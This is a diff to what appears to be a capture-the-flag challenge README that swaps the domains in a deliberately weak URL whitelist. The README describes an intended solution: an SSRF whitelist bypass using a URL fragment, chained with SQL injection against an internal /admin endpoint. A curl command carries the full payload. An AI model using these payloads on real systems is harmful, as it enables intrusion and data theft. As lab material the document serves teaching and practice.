@@ -9,14 +9,14 @@ Flag format: `practice{...}`
 Public app is a "corporate webview" proxy:
 
 - only logged-in users can access webview API,
-- URL is checked by a weak whitelist (`google.com`, `ya.ru/maps`, `wikipedia.org`),
+- URL is checked by a weak whitelist (`curl.com`, `github.com`),
 - backend then fetches URL server-side.
 
 Internal admin service is not exposed publicly and has SQLi in `/admin`.
 Player should:
 
 1. log in as regular user,
-2. bypass weak whitelist (for example with fragment `#google.com`),
+2. bypass weak whitelist (for example with fragment `#github.com`),
 3. reach internal `/admin`,
 4. exploit SQLi in `login/password`,
 5. get flag from DB.
@@ -45,7 +45,7 @@ Whitelist check is intentionally weak:
 
 So payload like below passes whitelist by fragment:
 
-`http://127.0.0.1/admin/...#google.com`
+`http://127.0.0.1/admin/...#github.com`
 
 but request is sent to internal `/admin`.
 
@@ -100,7 +100,7 @@ curl -s -L -c cookies.txt \
 curl -s -b cookies.txt \
   -X POST http://localhost:31337/api/webview \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#google.com"}'
+  -d '{"url":"http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#github.com"}'
 ```
 
 Expected output contains:
